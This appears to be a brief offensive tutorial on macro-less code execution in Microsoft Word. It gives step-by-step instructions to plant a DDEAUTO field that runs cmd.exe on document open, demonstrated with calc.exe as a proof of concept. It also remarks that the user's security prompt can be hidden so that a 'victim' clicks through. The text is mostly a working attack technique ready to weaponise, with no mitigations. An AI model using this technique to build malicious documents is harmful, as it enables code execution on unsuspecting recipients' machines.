# Macro-less code Execution in MSWord

Insert tab -> Quick Parts -> Field

![image](/images/Macro-less/1.png)

Clck on "Insert Field"

![image](/images/Macro-less/1.1.png)

Choose = (Formula) and click ok.

![image](/images/Macro-less/2.png)

After that, you should see a Field inserted in the document with an error “!Unexpected End of Formula”, right-click the Field, and choose Toggle Field Codes.

![image](/images/Macro-less/3.png)

The Field Code should now be displayed, change it to Contain the following:

{DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"  }
The DDEAUTO keyword is to inform MSWord that this is a DDE field, and will auto execute when the document is opened, the second part is the full path of the executable to execute, and the last part between quotes are the arguments to pass to this executable (execute calc.exe).
Now save the document as a normal word document “.docx”, and open it on any machine.

The first warning is to update the document links, nothing malicious there.
![image](/images/Macro-less/5.png)

The second prompt asks the user whether or not they want to execute the specified application, now this can be considered as a security warning since it asks the user to execute “cmd.exe”, however with proper syntax modification it can be hidden.
When the victim clicks yes, we see the calculator app gets openend.

![image](/images/Macro-less/6.png)
